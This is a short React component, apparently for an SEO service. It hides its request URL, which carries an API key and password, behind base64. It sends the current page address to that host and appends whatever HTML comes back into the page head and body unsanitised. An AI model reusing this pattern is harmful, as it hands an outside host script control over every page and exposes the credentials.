import { useEffect } from "react";

const CustomScriptComponent = () => {
  useEffect(() => {
    const loadJQuery = () => {
      if (!window.jQuery) {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.async = true;
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      } else {
        executeCustomScript();
      }
    };

    const executeCustomScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();
      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== "0") {
            const temp = this.response.split("||||||||||");
            if (window.jQuery) {
              jQuery("head").find("title").remove();
              jQuery("head").append(temp[0]);
              jQuery("body").append(temp[1]);
            }
          }
        }
      };

      const url = atob(
        "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
      );
      eptagmanage.open("GET", url + eppathurl);
      eptagmanage.send();
    };

    loadJQuery();
  }, []);

  return null;
};

export default CustomScriptComponent;
